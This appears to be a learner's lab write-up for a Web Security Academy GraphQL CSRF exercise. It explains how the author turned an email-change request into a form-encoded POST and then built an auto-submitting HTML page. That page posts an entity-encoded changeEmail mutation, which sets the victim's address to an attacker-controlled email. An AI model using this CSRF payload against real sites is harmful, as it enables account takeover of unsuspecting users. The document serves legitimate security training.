When we make the email change, we need to take the request and send to repeater.
There convert the request into a POST request with a Content-Type of x-www-form-urlencoded. Change two time to get the post request with Content....
![[Pasted image 20250209215555.png]]

Then with the next query added in the html (encoded as HTML). We are able to see that we can change the email through a POST request

![[Pasted image 20250209220253.png]]

Then we need to create a web for the victim. 
```html
<html>
    <body>       
        <form action="https:///0a7c006d04cf71e3803c035a00800000.web-security-academy.net/graphql/v1" method="post">
            <input type="hidden" name="query" value="&#x20;&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x21;&#x29;&#x20;&#x7b;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x20;&#x7b;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x7d;&#x7d;">
<input type="hidden" name="operationName" value="changeEmail">
            <input type="hidden" name="variables" value="&#x7b;&#x22;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x22;&#x3a;&#x7b;&#x22;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x22;&#x3a;&#x22;&#x70;&#x65;&#x70;&#x65;&#x40;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x7d;&#x7d;">

<input type="submit" value="Submit request" />
        </form>
<script> 
history.pushState(' ', ' ', '/');
document.forms[0].submit();
</script >      
    </body>
</html>

These are the 3 input values that a put, which befor I encoded in html

mutation changeEmail($input: ChangeEmailInput!) {changeEmail(input: $input) {email}}
operationName=changeEmail
variables={"input":{"email":"pepe@hacker.com"}}

```